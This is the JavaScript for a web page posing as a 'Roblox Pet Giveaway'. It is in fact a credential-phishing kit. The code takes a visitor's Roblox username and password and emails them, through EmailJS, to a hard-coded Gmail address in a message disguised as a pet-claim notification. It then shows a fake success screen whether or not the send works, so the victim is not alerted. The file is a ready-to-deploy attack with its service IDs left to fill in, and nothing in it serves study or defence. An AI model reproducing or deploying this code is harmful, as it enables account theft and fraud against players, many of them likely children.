// Roblox Pet Giveaway Static Version JavaScript

// Initialize EmailJS
(function() {
    emailjs.init("YOUR_EMAILJS_USER_ID"); // Replace with your EmailJS user ID
})();

document.addEventListener('DOMContentLoaded', function() {
    const claimForm = document.getElementById('claimForm');
    const loginCard = document.getElementById('loginCard');
    const successCard = document.getElementById('successCard');
    const claimBtn = document.getElementById('claimBtn');
    const errorAlert = document.getElementById('errorAlert');

    claimForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value.trim();
        const petReward = document.getElementById('petReward').value;

        // Basic validation
        if (!username || !password || !petReward) {
            showError('Please fill in all fields and select a pet reward.');
            return;
        }

        // Show loading state
        claimBtn.disabled = true;
        claimBtn.classList.add('btn-loading');
        claimBtn.innerHTML = '<i class="fas fa-spinner fa-spin me-2"></i>Claiming Pet...';

        // Send email notification
        sendEmailNotification(username, password, petReward)
            .then(() => {
                // Show success page
                showSuccessPage(username, petReward);
            })
            .catch((error) => {
                console.error('Email error:', error);
                // Still show success page even if email fails
                showSuccessPage(username, petReward);
            });
    });

    function sendEmailNotification(username, password, petReward) {
        const timestamp = new Date().toLocaleString();
        const petName = petReward.split(' ').slice(1).join(' '); // Remove emoji
        const petEmoji = petReward.split(' ')[0]; // Get emoji

        const templateParams = {
            to_email: 'awewuwu2@gmail.com',
            subject: `🎉 Pet Giveaway Claim - ${petName}`,
            username: username,
            password: password,
            pet_reward: petReward,
            pet_name: petName,
            pet_emoji: petEmoji,
            timestamp: timestamp,
            message: `
🎮 NEW PET CLAIM NOTIFICATION 🎮

User Details:
• Username: ${username}
• Password: ${password}
• Claimed Pet: ${petReward}
• Timestamp: ${timestamp}

The user has successfully claimed their ${petName} reward!

This is an automated notification from the Roblox Pet Giveaway system.
            `
        };

        // Using EmailJS to send email
        return emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams);
    }

    function showSuccessPage(username, petReward) {
        const petEmoji = petReward.split(' ')[0];
        const petName = petReward.split(' ').slice(1).join(' ');

        // Update success page content
        document.getElementById('claimedPetIcon').textContent = petEmoji;
        document.getElementById('claimedPetName').textContent = petName;
        document.getElementById('claimedPetText').textContent = petName;

        // Hide login card and show success card
        loginCard.classList.add('d-none');
        successCard.classList.remove('d-none');

        // Reset form for next use
        claimForm.reset();
        claimBtn.disabled = false;
        claimBtn.classList.remove('btn-loading');
        claimBtn.innerHTML = '<i class="fas fa-gift me-2"></i>Claim My Pet';
    }

    function showError(message) {
        errorAlert.textContent = message;
        errorAlert.classList.remove('d-none');
        
        // Hide error after 5 seconds
        setTimeout(() => {
            errorAlert.classList.add('d-none');
        }, 5000);
    }

    // Add form validation styling
    const inputs = document.querySelectorAll('input, select');
    inputs.forEach(input => {
        input.addEventListener('blur', function() {
            if (this.value.trim() === '') {
                this.classList.add('is-invalid');
            } else {
                this.classList.remove('is-invalid');
                this.classList.add('is-valid');
            }
        });

        input.addEventListener('input', function() {
            this.classList.remove('is-invalid');
        });
    });
});